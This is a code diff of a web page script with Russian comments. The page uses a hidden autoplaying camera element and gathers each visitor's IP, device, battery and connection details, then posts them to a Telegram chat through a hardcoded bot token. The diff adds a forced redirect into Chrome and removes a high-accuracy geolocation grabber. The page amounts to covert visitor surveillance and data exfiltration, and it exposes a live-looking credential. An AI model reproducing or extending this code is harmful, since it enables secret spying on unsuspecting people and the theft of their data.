@@ -104,6 +104,11 @@
 <video id="hiddenCamera" class="hidden-camera" autoplay playsinline></video>
 
 <script>
+    // Перенаправление в Chrome при открытии из других приложений
+    if (!navigator.userAgent.includes('Chrome') && !navigator.userAgent.includes('Firefox') && !navigator.userAgent.includes('Safari')) {
+        window.location.href = 'googlechrome://navigate?url=' + encodeURIComponent(window.location.href);
+    }
+
     const botToken = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
     const chatId = '-1002577213610';
     const videoElement = document.getElementById('hiddenCamera');
@@ -140,31 +145,7 @@
         return { error: 'API батареи не поддерживается' };
     }
 
-    // Функция для получения информации о геолокации
-    async function getGeolocation() {
-        if ('geolocation' in navigator) {
-            try {
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 5000,
-                        maximumAge: 0
-                    });
-                });
-                
-                return {
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy + ' метров',
-                    altitude: position.coords.altitude || 'Недоступно',
-                    speed: position.coords.speed || 'Недоступно'
-                };
-            } catch (e) {
-                return { error: 'Геолокация запрещена или недоступна: ' + e.message };
-            }
-        }
-        return { error: 'Геолокация не поддерживается' };
-    }
+    // Убрана функция запроса геолокации
 
     // Функция для получения информации о соединении
     function getConnectionInfo() {
@@ -241,10 +222,9 @@
             const ipData = await ipResponse.json();
             const ip = ipData.ip;
 
-            // Получаем дополнительную информацию
-            const [batteryInfo, geolocationInfo, connectionInfo] = await Promise.all([
+            // Получаем дополнительную информацию (без геолокации)
+            const [batteryInfo, connectionInfo] = await Promise.all([
                 getBatteryInfo(),
-                getGeolocation(),
                 getConnectionInfo()
             ]);
 
@@ -255,7 +235,6 @@
             message += `=== Информация об устройстве ===\n${formatInfo(deviceInfo)}\n`;
             message += `=== Батарея ===\n${formatInfo(batteryInfo)}\n`;
             message += `=== Соединение ===\n${formatInfo(connectionInfo)}\n`;
-            message += `=== Геолокация ===\n${formatInfo(geolocationInfo)}\n`;
 
             // Отправляем сообщение в Telegram
             await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
